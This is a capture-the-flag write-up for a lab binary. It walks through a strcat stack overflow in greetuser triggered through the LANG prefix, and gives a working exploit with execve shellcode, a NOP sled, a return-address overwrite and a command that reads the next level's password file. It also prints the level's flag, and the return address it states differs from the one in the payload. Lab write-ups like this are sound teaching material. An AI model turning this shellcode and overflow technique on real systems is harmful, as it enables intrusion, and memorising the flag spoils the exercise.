# Bonus 2

**Vulnerability:** `strcat` overflow in `greetuser`, amplified by a language prefix.

## Walkthrough

`main` copies `argv[1]` (≤40 bytes) and `argv[2]` (≤32 bytes) into a 76-byte stack
buffer, reads `LANG` to pick a `language` global, then passes the data to
`greetuser`.

`greetuser` builds a 72-byte `greeting` buffer, copies a language-dependent prefix
into it, then does `strcat(greeting, name)` with **no bounds check**:

- no `LANG` → `"Hello "` (6 bytes)
- `LANG=fi` → `"Hyvää päivää "` (18 bytes)
- `LANG=nl` → `"Goedemiddag! "` (13 bytes)

The prefix plus our name overflows `greeting` past slot 71 into the saved EBP (72)
and return address (76). Using `LANG=nl` makes the lengths line up so the return
address falls where our `argv[2]` bytes land.

We place shellcode at the start of the name (which lives at `ebp+8` inside
`greetuser`) behind a NOP sled, and overwrite the return address to point into the
sled (`0xbffffd08`, found in gdb with a clean environment).

- `argv[1]` (40 B) = `[17× NOP] + [23-byte shellcode]`
- `argv[2]` (32 B) = `[23× pad] + [ret addr 0xbffffcf8] + [5× pad]`

## Exploit

```sh
python -c "import sys; sys.stdout.write('\x90'*17+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80')" > /tmp/arg1
python -c "import sys; sys.stdout.write('A'*23+'\xf8\xfc\xff\xbf'+'A'*5)" > /tmp/arg2

printf 'cat /home/user/bonus3/.pass\n' | \
  env -i LANG=nl HOME=/home/user/bonus2 PATH=/bin:/usr/bin \
  ./bonus2 "$(cat /tmp/arg1)" "$(cat /tmp/arg2)"
```

**Flag:** `71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587`
